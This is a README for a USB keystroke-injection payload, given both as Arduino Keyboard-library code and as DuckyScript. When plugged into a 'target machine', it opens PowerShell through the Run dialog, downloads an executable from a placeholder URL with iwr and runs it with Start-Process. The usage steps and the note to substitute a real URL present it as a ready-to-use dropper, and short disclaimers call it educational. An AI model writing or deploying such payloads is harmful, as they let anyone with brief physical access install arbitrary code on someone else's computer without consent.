

## **README: Script to Download and Execute a File Using PowerShell**

### **Overview**
This project contains two scripts (Arduino and DuckyScript) that use keyboard emulation to:
1. Open the Windows Run dialog.
2. Launch PowerShell.
3. Execute a command to download a file from the internet and run it.

These scripts are designed for educational purposes or automation tasks. Use responsibly.

---

### **1. Arduino Code**
#### **Description**
The Arduino script uses the `Keyboard` library to emulate keyboard input, automating the process of opening PowerShell, downloading a file, and executing it.

#### **Code**
```cpp
#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1500);
  Keyboard.print("iwr -Uri \"https://example.com\" -OutFile \"C:\\Temp\\installer.exe\" ; Start-Process \"C:\\Temp\\installer.exe\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.end();
}

void loop() {

}
```

#### **Usage**
1. Flash the code onto an Arduino-compatible board that supports keyboard emulation (e.g., Arduino Micro, Leonardo, etc.).
2. Plug the device into the target machine.
3. The script will:
   - Open the Run dialog.
   - Launch PowerShell.
   - Download a file from `https://example.com` and save it to `C:\Temp\installer.exe`.
   - Execute the downloaded file.

#### **Dependencies**
- Arduino IDE with the `Keyboard` library included.
- Ensure the target system allows execution of PowerShell commands.

---

### **2. DuckyScript**
#### **Description**
The DuckyScript version is written for a USB Rubber Ducky device, which automates keystrokes in a similar manner.

#### **Script**
```plaintext
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1500
STRING iwr -Uri "https://example.com" -OutFile "C:\Temp\installer.exe" ; Start-Process "C:\Temp\installer.exe"
ENTER
DELAY 500
```

#### **Usage**
1. Copy the script into a file named `payload.txt`.
2. Flash the script onto a USB Rubber Ducky using the Duck Encoder.
3. Plug the device into the target machine.
4. The script will:
   - Open the Run dialog.
   - Launch PowerShell.
   - Download a file from `https://example.com` and save it to `C:\Temp\installer.exe`.
   - Execute the downloaded file.

#### **Dependencies**
- USB Rubber Ducky hardware.
- Duck Encoder to compile the script into an inject.bin file.

---

### **Important Notes**
1. **Legal and Ethical Usage**: These scripts are powerful tools for automation but can be misused. Use them only in environments where you have explicit permission.
2. **File URL**: Replace `https://example.com` with the actual URL of the file you want to download.
3. **Target Compatibility**: Ensure the target system has PowerShell enabled and allows script execution.
4. **Testing**: Always test scripts in a controlled environment before deploying.

---

### **Disclaimer**
This project is for **educational purposes only**. Unauthorized use of these scripts may violate laws or organizational policies. The author is not responsible for any misuse. Always obtain permission before using these scripts on any device.
